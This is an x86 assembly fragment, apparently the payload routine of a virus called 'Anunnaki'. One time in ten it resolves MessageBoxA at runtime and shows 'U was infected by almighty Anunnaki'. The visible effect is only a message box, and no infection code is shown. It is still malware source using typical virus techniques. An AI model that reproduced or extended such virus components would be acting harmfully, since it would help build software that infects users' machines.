; payload for anunnaki
                assume ebp:ptr vars

payload:            pushad

                ; 1 out of ten times execute payload
                mov eax,10
                call rand 
                test eax,eax
                jnz payload_fail  
                    
                push_sz <user32.dll>
                push esp 
                call dword ptr [ebp].aLoadLibrary
                add esp,12
                test eax,eax
                jz payload_fail
                    
                push_sz <MessageBoxA\000>
                push esp ; api string 
                push eax ; hmodule 
                call MyGetProcAddress
                add esp,16
                test eax,eax
                jz payload_fail
                
                push_sz <U was infected by almighty Anunnaki\000>
                mov ebx,esp
                push_sz <Hello>
                mov ecx,esp
                    
                push 0
                push ecx
                push ebx
                push 0
                call eax
                add esp,12 * 4
                    
payload_fail:           popad 
                retn  
